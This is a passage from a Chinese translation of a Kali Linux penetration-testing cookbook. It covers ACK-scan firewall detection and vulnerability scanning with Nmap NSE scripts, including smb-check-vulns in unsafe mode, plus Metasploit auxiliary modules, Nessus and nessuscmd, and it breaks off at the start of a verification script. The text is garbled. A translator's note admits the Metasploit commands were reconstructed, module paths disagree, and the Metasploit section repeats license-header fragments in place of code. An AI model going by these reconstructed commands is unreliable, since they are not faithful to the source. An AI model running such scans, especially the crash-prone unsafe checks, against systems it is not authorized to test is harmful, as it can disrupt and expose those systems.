  ```\n\n263\n\n# 指纹识别\n\n为了对所有可能的 TCP 端口进行扫描，必须扫描所有可能的端口地址值。\n\nTCP 头部中定义源端口和目的端口地址的部分长度均为\
  \ 16 位。每个位可以保留 1 或 0 的值。因此，有 $2^{16}$ 或 65,536 个可能的 TCP 端口地址。为了扫描总可能的地址空间，必须提供从\
  \ 1 到 65535 的端口范围：\n\n```\nroot@KaliLinux:~# nmap -sA 172.16.36.135 -p 1-65535\n\
  Starting Nmap 6.25 ( http://nmap.org ) at 2014-01-24 11:21 EST\nNmap scan report\
  \ for 172.16.36.135\nHost is up (0.00041s latency).\nAll 65535 scanned ports on\
  \ 172.16.36.135 are unfiltered\nMAC Address: 00:0C:29:3D:84:32 (VMware)\nNmap done:\
  \ 1 IP address (1 host up) scanned in 1.77 seconds\n```\n\n### 工作原理……\n\n除了 Nmap\
  \ 提供的许多其他功能外，它还可以用于识别防火墙过滤。Nmap 执行此类防火墙识别的方法在很大程度上是使用了之前在 Scapy 教程中讨论过的技术。通过向目标端口发送\
  \ SYN 和未请求的 ACK 数据包的组合，并分析响应来确定过滤状态。\n\n### 使用 Metasploit 进行防火墙识别\n\nMetasploit\
  \ 拥有一个扫描辅助模块，可以对网络端口进行多线程分析，基于 SYN/ACK 探测-响应分析，来确定这些端口是否被过滤。\n\n### 准备工作\n\n要使用\
  \ Metasploit 执行防火墙识别，你需要一个运行网络服务的远程系统。此外，你还需要实现某种过滤机制。这可以通过独立的防火墙设备或基于主机的过滤（如 Windows\
  \ 防火墙）来实现。通过操作防火墙设备上的过滤设置，你应该能够修改扫描结果。\n\n264\n\n### 如何操作……\n\n要使用 Metasploit ACK\
  \ 扫描模块执行防火墙和过滤识别，你必须首先在 Kali Linux 终端中启动 `msfconsole`，然后使用 `use` 命令选择所需的辅助模块：\n\n\
  ```\nroot@KaliLinux:~# msfconsole\n# cowsay++\n____________\n< metasploit >\n------------\n\
  ```\n\n```\n< metasploit > use auxiliary/scanner/tcp/ack_scan\n< metasploit > show\
  \ options\n< metasploit > set RHOSTS 172.16.36.135\n< metasploit > set PORTS 1-65535\n\
  < metasploit > set THREADS 25\n< metasploit > run\n```\n\n（注：提供的命令序列原始文本是碎片化/重复的；我已根据标准的\
  \ Metasploit 用法和提供的上下文重建了逻辑流。）\n\n\n\n\n将获得不同的输出。由于此主机位于防火墙之后，输出中记录了与未过滤端口相关的响应变化：\n\
  \n```\nmsf auxiliary(ack) > set RHOSTS 83.166.169.228\nRHOSTS => 83.166.169.228\n\
  msf auxiliary(ack) > show options\n```\n\n模块选项 (auxiliary/scanner/portscan/ack):\n\
  \nName 当前设置 需要 描述\n---- --------------- -------- -----------\nBATCHSIZE 256 yes\
  \ 每组扫描的主机数量\nINTERFACE no 接口名称\nPORTS 1-100 yes 要扫描的端口（例如 22-25,80,110-900）\nRHOSTS\
  \ 83.166.169.228 yes 目标地址范围或 CIDR 标识符\nSNAPLEN 65535 yes  捕获的字节数\nTHREADS 25 yes\
  \ 并发线程数\nTIMEOUT 500 yes 以毫秒为单位的响应读取超时\n\n```\nmsf auxiliary(ack) > run\n[*] TCP\
  \ UNFILTERED 83.166.169.228:80\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary\
  \ module execution completed\n```\n\n### 指纹识别\n\n### 工作原理……\n通过审查服务指纹识别结果并研究与已识别版本相关的漏洞，可以识别许多潜在漏洞，但这通常会花费大量时间。通常有更高效的替代方案可以替你完成这大部分工作。这些替代方案包括使用自动化脚本和程序，它们可以通过扫描远程系统来识别漏洞。\n\
  \n未经认证的漏洞扫描器通过向服务发送一系列不同的探测，尝试获取表明存在漏洞的响应。或者，认证的漏洞扫描器将使用提供的凭据直接查询远程系统，获取有关安装应用程序、运行服务、文件系统和注册表内容的信息。\n\
  \n本章将包含以下执行自动化漏洞扫描的方案：\n- 使用 Nmap 脚本引擎 (NSE) 进行漏洞扫描\n- 使用 MSF 辅助模块进行漏洞扫描\n- 使用 Nessus\
  \ 创建扫描策略\n- 使用 Nessus 进行漏洞扫描\n- 使用 `Nuscmd` 进行命令行扫描\n- 通过 HTTP 交互验证漏洞\n- 通过 ICMP\
  \ 交互验证漏洞\n\n#### 使用 Nmap 脚本引擎进行漏洞扫描\nNmap 脚本引擎 (NSE) 提供了大量脚本，可用于一系列评估远程系统的自动化任务。在\
  \ Kali 中可以找到现有 NSE 脚本被分为若干不同的类别，其中一类就是漏洞识别。\n\n### 准备工作\n要使用 NSE 进行漏洞分析，你需要一个在 TCP\
  \ 或 UDP 上运行网络服务的系统。在所提供的示例中，使用了一个带有漏洞 SMB 服务的 Windows XP 系统执行此任务。有关设置 Windows 系统的更多信息，请参阅第\
  \ 1 章 *入门* 中的 *安装 Windows Server*。\n\n### 如何操作……\n人们有多种方法可以识别与任何给定 NSE 脚本相关的功能。最有效的方法之一是引用\
  \ Nmap 脚本目录下的 `script.db` 文件。要查看该文件的内容，我们可以如下使用 `cat` 命令：\n\n```\nroot@KaliLinux:~\
  \ cat /usr/share/nmap/scripts/script.db | more\n```\n\n{ filename = \"ac-info.nse\"\
  , categories = { \"discovery\", \"safe\" } }\n{ filename = \"address-info.nse\"\
  , categories = { \"default\", \"safe\" } }\n{ filename = \"brute.nse\", categories\
  \ = { \"brute\", \"intrusive\" } }\n{ filename = \"ls.nse\", categories = { \"discovery\"\
  , \"safe\" } }\n{ filename = \"path-vuln.nse\", categories = { \"exploit\", \"intrusive\"\
  , \"vuln\" } }\n{ filename = \"serverinfo.nse\", categories = { \"default\", \"\
  discovery\", \"safe\" } }\n{ filename = \"showmount.nse\", categories = { \"discovery\"\
  , \"safe\" } }\n{ filename = \"auth.nse\", categories = { \"auth\", \"default\"\
  , \"safe\" } }\n{ filename = \"brute.nse\", categories = { \"brute\", \"intrusive\"\
  \ } }\n{ filename = \"headers.nse\", categories = { \"discovery\", \"safe\" } }\n\
  { filename = \"methods.nse\", categories = { \"default\", \"safe\" } }\n{ filename\
  \ = \"request.nse\", categories = { \"discovery\", \"safe\" } }\n\n`script.db` 文件是一个非常简单的索引，显示了每个\
  \ NSE 脚本的文件名及其所属的类别。这些类别是标准化的，便于使用 `grep` 搜索特定类型的脚本。漏洞扫描的类别名称为 `vuln`。要识别所有漏洞脚本，需要\
  \ `grep` 术语 `vuln` 然后使用 `cut` 命令提取每个脚本的文件名。可以在以下截断的输出中看到：\n\n```\nroot@KaliLinux:~#\
  \ grep vuln /usr/share/nmap/scripts/script.db | cut -d'\"' -f 2\npath-vuln.nse\n\
  broadcast-avahi-dos.nse\ndistcc-cve2004-2687.nse\nfirewall-bypass.nse\nftp-libopie.nse\n\
  ftp-proftpd-backdoor.nse\nftp-vsftpd-backdoor.nse\nftp-vuln-cve2010-4221.nse\nhttp-awstatotals-exec.nse\n\
  http-axis2-dir-traversal.nse\nhttp-enum.nse\nhttp-frontpage-login.nse\nhttp-git.nse\n\
  http-huawei-hg5xx-vuln.nse\nhttp-iis-webdav-vuln.nse\nhttp-litespeed-sourcecode-download.nse\n\
  http-majordomo2-dir-traversal.nse\nhttp-method-tamper.nse\nhttp-passwd.nse\nhttp-phpself-xss.nse\n\
  http-slowloris-check.nse\nhttp-sql-injection.nse\nhttp-tplink-dir-traversal.nse\n\
  ```\n\n为了进一步评估上述列表中任何给定脚本的使用，可以使用 `cat` 命令读取与 `script.db` 文件相同目录下的 `.nse` 文件。由于大多数描述性内容通常位于文件开头，建议将内容通过到\
  \ `more` 工具，以便从上到下读取文件，如下所示：\n\n```\nroot@KaliLinux:~ cat /usr/share/nmap/scripts/smb-check-vulns.nse\
  \ | more\n```\n\n```\nlocal msrpc = require \"msrpc\"\nlocal nmap = require \"nmap\"\
  \nlocal smb = require \"smb\"\nlocal stdnse = require \"stdnse\"\nlocal string =\
  \ require \"string\"\nlocal table = require \"table\"\ndescription = [[\n检查漏洞：\n\
  *** MS08-067, 一个 Windows RPC 漏洞\n*** Conficker, Conficker 蠕虫感染\n*** 未命名的 regsvc\
  \ DoS，我在 Windows 2000 中偶然发现的一个拒绝服务漏洞\n*** SMBv2 漏洞利用 (CVE-2009-3103, Microsoft 安全公告\
  \ 975497)\n*** MS06-025, 一个 Windows Ras RPC 服务漏洞\n*** MS07-029, 一个 Windows Dns Server\
  \ RPC 服务漏洞\n警告：这些检查是非常危险的，极有可能导致服务器崩溃。除非你（更重要的是业务部门）完全了解这些风险，否则不应在生产环境中运行它们！\n]]\n\
  ```\n\n\n\n\n可以在在线进行查询以获取更多信息。通过继续阅读，可以了解到更多关于该脚本的如下：\n\n### @usage\n\n```bash\n\
  -- nmap --script smb-check-vulns.nse -p445 <host>\n-- sudo nmap -sU -sS --script\
  \ smb-check-vulns.nse -p U:137,T:139 <host>\n```\n\n### @output\n\n272\n\n*第 5 章*\n\
  \n**主机脚本结果:**\n```text\n--\n-- | smb-check-vulns:\n-- | MS08-067: NOT VULNERABLE\n\
  -- | Conficker: Likely CLEAN\n-- | regsvc DoS: regsvc DoS: NOT VULNERABLE\n-- |\
  \ SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE\n-- | MS06-025: NO SERVICE (the Ras\
  \ RPC service is inactive)\n-- |_ MS07-029: NO SERVICE (the Dns Server RPC service\
  \ is inactive)\n```\n\n**@args unsafe**: 如果设置，此脚本将运行某些检查，如果系统未打补丁，这些检查几乎注会导致某些程序崩溃。记住，非安全的检查并不意味着是安全的。\n\
  **@args safe**: 如果设置，此脚本将仅运行已知（或至少怀疑）安全的检查。\n\n-----------------------------------------------------------------------\n\
  \n通过继续向下阅读，我们可以找到关于脚本特定参数、适当用法以及预期脚本输出示例的细节。需要注意的是，有一个安全参数（unsafe argument）可以被设置为\
  \ `0`（未激活）或 `1`（已激活）。这实际上是 Nmap 漏洞脚本中常用的参数，理解其用途至关重要。默认情况下，`unsafe` 参数设置为 `0`。当此值被设置时，Nmap\
  \ 不执行任何可能导致拒绝服务状态的测试。虽然这听起来是最佳选择，但它通常意味着许多测试结果的准确性较低，且某些测试将完全不会执行。为了进行更彻底、准确的扫描，建议激活\
  \ `unsafe` 参数，但应仅在授权的测试窗口内针对生产系统进行。\n\n要运行漏洞扫描，应使用 `nmap --script` 参数定义特定的 NSE 脚本，并使用\
  \ `nmap --script-args` 参数传递所有特定的脚本参数。此外，为了以最少干扰输出运行漏洞扫描，应配置 Nmap 仅扫描与扫描服务对应的端口，如下：\n\
  \n```bash\nroot@KaliLinux:~# nmap --script smb-check-vulns.nse --script-args=unsafe=1\
  \ -p445 172.16.36.225\nStarting Nmap 6.25 ( http://nmap.org ) at 2014-03-09 03:58\
  \ EDT\nNmap scan report for 172.16.36.225\nHost is up (0.00041s latency).\nPORT\
  \ STATE SERVICE\n273\n445/tcp open microsoft-ds\nMAC Address: 00:0C:29:18:11:FB\
  \ (VMware)\nHost script results:\n| smb-check-vulns:\n| MS08-067: VULNERABLE\n|\
  \ Conficker: Likely CLEAN\n| regsvc DoS: NOT VULNERABLE\n| SMBv2 DoS (CVE-2009-3103):\
  \ NOT VULNERABLE\n|_ MS07-029: NO SERVICE (the Dns Server RPC service is inactive)\n\
  Nmap done: 1 IP address (1 host up) scanned in 18.21 seconds\n```\n\n我还要引起大家注意另一个\
  \ NSE 脚本，因为它教导了一个关于漏洞扫描实践的重要教训。该脚本是 `smb-vuln-ms10-061.nse`。可以通过 `cat` 命令配合管道 `more`\
  \ 从上到下阅读来查看该脚本的细节：\n\n```bash\nroot@KaliLinux:~# cat /usr/share/nmap/scripts/smb-vuln-ms10-061.nse\
  \ | more\n```\n\n```lua\nlocal bin = require \"bin\"\nlocal msrpc = require \"msrpc\"\
  \nlocal smb = require \"smb\"\nlocal string = require \"string\"\nlocal vulns =\
  \ require \"vulns\"\nlocal stdnse = require \"stdnse\"\ndescription = [[\n测试目标机器是否受到\
  \ ms10-061 打印机池程序身份充漏洞的影响。\n该漏洞是震网病毒（Stuxnet worm）利用的四个漏洞之一。该脚本以安全的方式检查漏洞，没有导致远程系统崩溃的可能性，因为这不是一个内存损坏漏洞。为了使检查生效，它需要访问远程系统上的至少一个共享打印机。默认情况下，它尝试使用\
  \ LANMAN API 列举打印机，该 API 在某些系统上默认是不可用的。在这种情况下，用户应指定打印机共享名称作为打印脚本参数。要查找打印机共享，可以使用\
  \ `smb-enum-shares`。\n```\n\n274\n\n*第 5 章*\n\n此外，在某些系统上，访问共享需要有效的凭据，这可以通过 `smb`\
  \ 库参数——`smbuser` 和 `smbpassword` 来指定。该漏洞的有趣之处在于，在实际被利用之前，必须有多个因素同时满足。首先，系统必须运行涉及的操作系统之一（XP,\
  \ Server 03 SP2, Vista, Server 08, 或 Windows 7）。其次，它必须缺少 MS10-061 补丁（该补丁修复了代码执行漏洞）。最后，系统上的本地打印共享必须是公开可的。这其中的有趣之处在于，无论系统上是否存在打印机共享，都可以对远程\
  \ SMB 打印池服务进行审计，以确定系统是否已打补丁。由于由于，对于什么是漏洞系统存在不同的解释。某些漏洞扫描器会将未补丁的系统识别为漏洞，尽管实际上该漏洞无法被利用。相反，其他漏洞扫描器（如\
  \ NSE 脚本）将评估所有条件来判断系统是否存在漏洞。在提供的示例中，被扫描的系统未补丁，但漏洞并未被利用。看以下示例：\n\n```bash\nroot@KaliLinux:~#\
  \ nmap -p445 172.16.36.225 --script=smb-vuln-ms10-061\nStarting Nmap 6.25 ( http://nmap.org\
  \ ) at 2014-03-09 04:19 EDT\nNmap scan report for 172.16.36.225\nHost is up (0.00036s\
  \ latency).\nPORT STATE SERVICE\n445/tcp open microsoft-ds\nMAC Address: 00:0C:29:18:11:FB\
  \ (VMware)\nHost script results:\n|_smb-vuln-ms10-061: false\nNmap done: 1 IP address\
  \ (1 host up) scanned in 13.16 seconds\n```\n\n在提供的示例中，Nmap 确定系统不存在漏洞，因为它没有远程打印机共享。虽然漏洞无法被利用是事实，但某些人仍会声称漏洞仍然存在，因为系统未打补丁，且当管理员决定从该设备共享打印机时，漏洞就可以被利用。这就是为什么必须评估所有漏洞扫描器的结果，以充分理解其含义。某些扫描器会选择只评估有限的条件，而另一些则更加详尽。\n\
  \n很难说这里的最佳答案是什么。大多数渗透测试人员可能更希望被告知由于环境因素不存在漏洞，这样他们就不必花费大量时间尝试利用一个无法利用的漏洞。相反，系统管理员可能更希望知道系统缺少\
  \ MS10-061 补丁，以便确保系统完全安全，即使在现有条件下该漏洞无法被利用。\n\n\n\n大多数漏洞扫描器会通过评估多个不同的响应来尝试确定系统是否容易受到特定攻击。在某些情况下，漏洞扫描可能简单到只需与远程服务建立\
  \ `TCP` 连接，并通过其自披露的横幅信息（banner）识别已知的漏洞版本。在其他情况下，可能会向远程服务发送一系列复杂的探测和特意构造的请求，以尝试诱导只有易受特定攻击的漏洞的服务所特有的响应。在提供的\
  \ NSE 漏洞扫描脚本示例中，如果激活了不安全的参数，漏洞扫描实际上会尝试利用该漏洞。\n\n## 使用 MSF 辅助模块进行漏洞扫描\n\n与 NSE 中提供的漏洞扫描脚本类似，Metasploit\
  \ 也提供了许多实用的漏洞扫描器。与 `Nmap` 的脚本一样，这些工具的大多数具有很强的针对性，并用于扫描特定的服务。\n\n### 准备工作\n\n要使用\
  \ Metasploit 辅助模块进行漏洞分析，你将需要一个通过 `TCP` 或 `UDP` 运行网络服务的系统。在提供的示例中，使用了一个带有 `RDP` 服务的\
  \ Windows XP 系统来执行此任务。有关如何设置 Windows 系统的更多信息，请参阅本书第 `1` 章 `入门`（Getting Started）中的\
  \ `安装 Windows Server` 教程。\n\n### 如何操作……\n\n有多种方法可以识别 Metasploit 中的漏洞扫描辅助模块。一种有效的方法是浏览到辅助扫描器目录，因为那里是大多数漏洞识别脚本所在的位置。查看以下示例：\n\
  \n```\nroot@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/scanner/\n\
  ```\n\n```bash\nmysql# cat mysql_authbypass_hashdump.rb | more\n```\n\n```ruby\n\
  ##\n# 此文件是 Metasploit Framework 的一部分，可能受到\n# 重新发和商业限制。请查看 Metasploit\n# 网站。\n```\n\
  \n## 使用 MSF 辅助模块进行漏洞扫描\n\n（此处 Metasploit 框架）\n\n# 此文件是 Metasploit Framework 的一部分，可能受到\n\
  # 重新发和商业限制。请查看 Metasploit\n# 网站。\n\n\n\n```ruby\n##\n# 此文件是 Metasploit Framework\
  \ 的一部分，可能受到\n# 重新发和商业限制。请查看 Metasploit\n# 网站。\n```\n\n276\n\n```ruby\n##\n# 此文件是\
  \ Metasploit Framework 的一部分，可能受到\n# 重新发和商业限制。请查看 Metasploit\n# 网站。\n```\n\n277\n\
  \n```ruby\n##\n# 此文件是 Metasploit Framework 的一部分，可能受到\n# 重新发和商业限制。请查看 Metasploit\n\
  # 网站。\n```\n\n279\n\n\n\n大多数漏洞扫描器通过评估多种不同的响应来尝试确定系统是否易易受到特定攻击的影响。在某些情况下，漏洞扫描可能简单到与远程服务建立\
  \ `TCP` 连接，并通过自泄露的横幅（banner）识别已知的漏洞版本。在其他情况下，可能需要向远程服务发送一系列复杂的探测和特制的请求，以诱导仅对易受特定攻击影响的服务才会产生的独特响应。在上述示例中，脚本作者可能发现了一种获取独特响应的方法，该响应仅会由已补丁或未补丁的系统生成，然后以此为基础来确定任何给定远程系统的可利用性。\n\
  \n# 使用 Nessus 创建扫描策略\n\nNessus 是最强大且最全面的漏洞扫描器之一。通过以一个系统或一组系统为目标，Nessus 会自动扫描所有可识别服务上的大量漏洞。在\
  \ Nessus 中可以构建扫描策略，以更具细粒度地定义 Nessus 测试的漏洞类型以及执行的扫描类型。本食谱将介绍如何在 Nessus 中配置独特的扫描策略。\n\
  \n### 准备工作\n\n要在 Nessus 中配置扫描策略，必须首先在 Kali Linux 渗透测试平台上安装一个可运行的 Nessus 副本。因为 Nessus\
  \ 是一款授权产品，它不会默认安装在 Kali 中。有关如何在 Kali 中安装 Nessus 的更多信息，请参阅`第 1 章，入门`中的`在 Kali Linux\
  \ 上安装 Nessus` 食谱。\n\n### 如何操作……\n\n要在 Nessus 中配置新的扫描策略，你首先需要访问 `https://localhost:8834`\
  \ 或 `https://127.0.0.1:8834` 上的 Nessus Web 界面。或者，如果你不是从运行 Nessus 的同一系统访问 Web 界面，则应指定相应的\
  \ IP 地址或主机名。一旦 Web 界面加载，你需要使用安装过程中配置的帐户或安装后创建的其他帐户登录。登录后，选择页面顶部的 `Policies`（策略）选项卡。如果没有配置其他策略，你将看到一个空列表和一个显示\
  \ `New Policy`（新建策略）的按钮。选择该按钮开始构建你的第一个扫描策略。\n\n点击 `New Policy` 后，将弹出 `Policy Wizards`（策略向导）屏幕，其中包含许多预配置的扫描模板，用于加速过程。如下截图所示，每个模板都包含一个名称以及其预期功能的简要描述：\n\
  \n在大多数情况下，这些预配置扫描配置中至少有一个与你尝试实现的目标相似。所有中最常用的可能是 `Basic Network Scan`（基本网络扫描）。请记住，在选择这些选项之一后，你仍然可以修改现有配置的每个细节。它们只是为了让你更快地上手。或者，如果你不想使用任何现有模板，可以向下滚动并选择\
  \ `Advanced Policy`（高级策略）选项，这将允许你从零开始。\n\n如果你选择了任何一个预配置模板，你将通过一个快速的三步过程来完成你的扫描配置。该过程总结如下步骤中：\n\
  \n1. **第 1 步**允许你配置基本细节，包括配置名称、描述和可见性（公共或私有）。公共配置对所有 Nessus 用户可见，而私有配置仅对创建它的用户可见。\n\
  2. **第 2 步**将询问扫描是内部还是外部的。外部扫描将针对公共访问的主机执行，这些主机通常位于企业网络的 `DMZ`（脱敏区）。外部扫描不需要你在同一网络中，但可以通过互联网进行。或者，内部扫描从网络内部进行，并直接访问扫描目标的\
  \ `LAN`（局域网）。\n3. **第 3 步**是最后一步，请求扫描设备的身份凭据，使用 `SSH` 或 `Windows` 身份验证。完成后，可以在访问\
  \ `Profiles`（配置）选项卡时在先前的空列表中看到新配置。\n\n这种方法可以快速方便地创建新的扫描配置，但对所测试的漏洞和执行的扫描类型没有足够的控制。要修改更详细的配置，点击新创建的策略名称，然后点击\
  \ `Advanced Mode`（高级模式）链接。此配置模式下的选项非常全面且具体。屏幕左侧可以访问四个不同的菜单，包括以下内容：\n\n- **General\
  \ Settings（常规设置）**：此菜单提供基本配置、定义如何执行发现和服务枚举的详细端口扫描选项，以及定义有关速度、节流、并行等等策略的性能选项。\n-\
  \ **Credentials（凭据）**：此菜单允许配置 `Windows` 凭据、`SSH`、`Kerberos` 甚至一些明文协议选项（不高度建议）。\n\
  - **Plugins（插件）**：此菜单对 Nessus 插件提供极度细粒度的控制。`Plugins` 是 Nessus 中用于执行特定审计或漏洞检查的术语。你可以根据功能类型启用或禁用审计组，甚至可以逐个操作特定插件。\n\
  - **Preferences（偏好设置）**：此菜单涵盖了 Nessus 所有更晦晦的操作函数的配置，例如 `HTTP` 身份验证、暴力破解设置和数据库交互。\n\
  \n### 工作原理……\n\n扫描策略定义了 Nessus 用于定义如何运行扫描的值。这些扫描策略可以简单到只需完成简单扫描向导设置所需的三个步骤，也可以复杂到定义每个独特的插件并应用自定义的身份验证和操作配置的程度。\n\
  \n# 使用 Nessus 进行漏洞扫描\n\nNessus 是可用最强大且最全面的漏洞扫描器之一。通过以一个系统或一组系统为目标，Nessus 会自动扫描所有可识别服务上的大量漏洞。一旦配置了扫描策略来定义\
  \ Nessus 扫描器的配置，就可以使用扫描策略对远程目标执行扫描进行评估。本食谱将介绍如何使用 Nessus 进行漏洞扫描。\n\n### 准备工作\n\n\
  要使用 Nessus 进行漏洞扫描，必须首先在 Kali Linux 渗透测试平台上安装一个可运行的 Nessus 副本。因为 Nessus 是一款授权产品，它不会默认安装在\
  \ Kali 中。有关如何在 Kali 中安装 Nessus 的更多信息，请参阅`第 1 章，入门`中的`在 Kali Linux 上安装 Nessus` 食谱。此外，在用\
  \ Nessus 扫描之前，至少需要创建一个扫描策略。有关在 Nessus 中创建扫描策略的更多信息，请参阅前面的食谱。\n\n### 如何操作……\n\n要开始\
  \ Nessus 中的一个新扫描，你需要确保 `Scans`（扫描）选项卡是\n\n\n\n\n在屏幕顶部选择。如果过去没有运行过扫描，将在屏幕中心生成一个空列表。要执行首次扫描，你需要点击屏幕左侧的蓝色“New\
  \ Scan”（新扫描）按钮，如下截图所示：这需要一些基础配置信息。系统会提示你输入一系列字段，包括 Name（名称）、Policy（策略）、Folder（文件夹）和\
  \ Targets（目标）。`Name` 字段仅被用作唯一标识符，用以将扫描结果与其他扫描结果区分开来。如果你正在执行大量扫描，使用非常具体的扫描名称将会有帮助。第二个字段真正定义了扫描的所有细节。该字段允许你选择将使用什么扫描策略。如果你不熟悉扫描策略的工作原理，请参考本书中前面的方案。登录用户创建的任何公共或私有扫描策略都应该显示在\
  \ `Policy` 下拉菜单中。`Folder` 字段定义了扫描结果放在哪个文件夹。当你需要筛选大量的扫描结果时，通过文件夹组织扫描很有帮助。可以通过点击主\
  \ Scans 菜单中的 `New Folder`新文件夹）来创建新的扫描文件夹。最后一个字段是 `Targets`。该字段显示了如何定义扫描哪些系统。在这里，你可以输入单个主机\
  \ IP 地址、IP 地址列表、顺序 IP 地址范围、CIDR 范围或 IP 范围列表。或者，你也可以使用主机名，假设扫描器能够通过 DNS 将其正确解析为 IP\
  \ 地址。最后，还有一个选项可以上传包含上述任何格式目标列表的文本文件，如下所示：\n\n284\n\n![](img/index-298_1.jpg)\n\n\
  ![](img/index-298_2.jpg)\n\n*第 5 章*\n\n配置扫描后，可以使用屏幕底部的 `Launch`（启动）按钮执行。这将立即将扫描添加到扫描列表中，并可以实时查看结果，如下截图所示：\n\
  \n285\n\n![](img/index-299_1.jpg)\n\n![](img/index-299_2.jpg)\n\n*漏洞扫描*\n\n即使在扫描运行期间，你也可以点击扫描名称并在漏洞被识别时开始查看它们。使用颜色编码可以快速方便地识别漏洞的数量及其严重程度，如下截图所示：在点击\
  \ \"Example scan\"（示例扫描）后，我们可以看到正在扫描的两个主机。\n\n第一个表示扫描已完成，第二个主机的完成率为 2%。`Vulnerabilities`\
  \ 列中的条形图显示了与每个指定主机相关的漏洞数量。或者，你可以点击屏幕顶部的 `Vulnerabilities` 链接，按发现的漏洞组织查找结果，然后按识别该漏洞的主机数量排序。在屏幕右侧，我们可以看到一个类似的饼图，但这个对应于所有扫描主机，如下截图所示：\n\
  \n286\n\n![](img/index-300_1.jpg)\n\n![](img/index-300_2.jpg)\n\n*第 5 章*\n\n该饼图还清晰地定义了每种颜色的含义，范围从严重漏洞到信息级详情。通过选择任何特定主机\
  \ IP 地址的链接，你可以查看该主机识别出的特定漏洞：\n\n此漏洞列表标识了插件名称（plugin name），它通常提供了发现结果的简要描述和严重程度。作为渗透测试人员，如果你寻求在目标系统上实现远程代码执行，那么严重和高危漏洞通常是有价值的。通过点击任何一个特定的漏洞，你可以获得关于该漏洞的大量细节，如下截图所示：\n\
  \n287\n\n*漏洞扫描*\n\n除了描述和补丁信息外，此页面还将提供进一步研究的替代来源，最重要的是（对于渗透测试人员而言）揭示是否存在利用程序（exploit）。此页面通常还会指示可用的利用程序是公共利用程序，还是存在\
  \ Metasploit、CANVAS 或 Core Impact 等漏洞利用框架中。\n\n### 工作原理……\n\n大多数漏洞扫描器通过评估许多不同的响应来运行，尝试确定系统是否容易受到特定攻击。在某些情况下，漏洞扫描可能简单到与远程服务建立\
  \ TCP 连接，并通过自披露的横幅（banner）识别已知漏洞版本。在其他情况下，可能会向远程服务发送一系列复杂的探测和特意构造的请求，尝试获取易受特定攻击的服务的所特有的响应。Nessus\
  \ 将大量测试组合在一起，尝试为给定目标生成完整的攻击面图谱。\n\n## 使用 Nessuscmd 进行命令行扫描\n\n`Nessuscmd` 是 Nessus\
  \ 中的一个命令行实用。如果你希望将 Nessus 插件扫描集成到脚本中，或重新评估之前识别的漏洞，`Nuscmd` 将非常有用。\n\n### 准备工作\n\n\
  若要使用 `Nuscmd` 进行漏洞扫描，必须先在 Kali Linux 渗透测试平台上安装一个可运行的 Nessus。由于 Nessus 是一项授权产品，因此\
  \ Kali 默认不安装它。有关如何在 Kali 中安装 Nessus 的更多信息，请参阅第 1 章《入门》中的 *在 Kali Linux 上安装 Nessus*\
  \ 方案。\n\n### 如何操作……\n\n要开始，你需要切换到包含 `nessuscmd` 脚本的目录。\n\n然后，在不提供任何参数的情况下执行脚本，你可以查看输出，其中包含了正确的用法和可用选项如下：\n\
  \n```\nroot@KaliLinux:~# cd /opt/nessus/bin/\nroot@KaliLinux:/opt/nessus/bin# ./nessuscmd\n\
  Error - no target specified\nnessuscmd (Nessus) 5.2.5 [build N25109]\nCopyright\
  \ (C) 1998 - 2014 Tenable Network Security, Inc\n```\n\n288\n\n*第 5 章*\n\n**用法：**\n\
  \n```\nnessuscmd <option> target...\n```\n\n要使用已知的 Nessus 插件 ID 对远程主机执行 `nessuscmd`\
  \ 扫描，你必须使用 `-i` 参数并提供所需的插件 ID 值。为了演示这一点，使用著名的 MS08-067 漏洞的插件 ID 执行了如下扫描：\n```\n\
  root@KaliLinux:/opt/nessus/bin# ./nessuscmd -i 34477 172.16.36.135\nStarting nessuscmd\
  \ 5.2.5\nScanning '172.16.36.135'...\n+ Host 172.16.36.135 is up\n```\n\n第一次扫描尝试是针对一个不受指定插件漏洞影响的主机执行的。输出显示主机在线，但没有提供额外输出。或者，如果系统存在漏洞，将返回专门对应于插件的输出：\n\
  \n```\nroot@KaliLinux:/opt/nessus/bin# ./nessuscmd -i 34477 172.16.36.225\nStarting\
  \ nessuscmd 5.2.5\nScanning '172.16.36.225'...\n+ Results found on 172.16.36.225\
  \ :\n- microsoft-ds (445/tcp)\n[!] Plugin ID 34477\nSynopsis:\n由于 'Server' 服务中的缺陷，可以在远程主机上执行任意代码。\n\
  Description:\n远程主机存在 'Server' 服务缓冲区溢出漏洞，可能允许攻击者以 'System' 权限在远程主机上执行任意代码。\nSee also\
  \ :\nhttp://technet.microsoft.com/en-us/security/bulletin/ms08-067\nSolution:\n\
  Microsoft 已为 Windows 2000、XP、2003、Vista 和 2008 发布了一系列补丁。\nRisk factor:\nCritical\
  \ / CVSS Base Score : 10.0\n```\n\n289\n\n*漏洞扫描*\n\n\n\n\n| (CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C)\
  \ |\n| CVSS 时间评分 : 8.7 |\n| (CVSS2#E:H/RL:OF/RC:C) |\n| 公共利用可用 : true |\n\n### 工作原理……\n\
  \n大多数漏洞扫描器通过评估多个不同的响应来操作，尝试确定系统是否容易受到特定攻击。在某些情况下，漏洞扫描可能仅仅是与远程服务建立 `TCP` 连接，并通过自我披露的\
  \ banner（横幅）识别已知的漏洞版本。在其他情况下，可能会向远程服务发送一系列复杂的探测和特殊构造的请求，以尝试获取易受特定攻击的服务的所特有的响应。`Nessuscmd`\
  \ 在给定特定插件 ID 的情况下，会执行与常规 Nessus 界面执行的完全相同的测试。唯一的区别在于执行漏洞扫描的方式。\n\n## 使用 HTTP 交互验证漏洞\n\
  \n作为渗透测试员，任何漏洞利用的最佳结果都是实现远程代码执行。然而，在某些情况下，我们可能只想确定远程代码执行漏洞是否可以被利用，但不想实际执行整个利用和后利用过程。实现此目标的方法是创建一个\
  \ Web 服务器来记录交互，并使用给定的漏洞执行代码，导致远程主机与 Web 服务器进行交互。本配方将演示如何编写自定义脚本，通过 HTTP 流量验证远程代码执行漏洞。\n\
  \n### 准备工作\n\n要使用 HTTP 交互验证漏洞，你需要一个运行带有远程代码执行漏洞软件的系统。此外，本节将要求使用 `VIM` 或 `Nano` 等文本编辑器向文件系统写入脚本。\n\
  \n有关编写脚本的更多信息，请参考本书 `第 1 章`、`入门` 中的“`使用文本编辑器 (VIM 和 Nano)`”配方。\n\n### 如何操作……\n\n\
  在实际利用给定漏洞之前，我们必须先部署一个会记录与其交互的 Web 服务器。这可以通过如下简单的 Python 脚本来实现：\n\n```python\n#!/usr/bin/python\n\
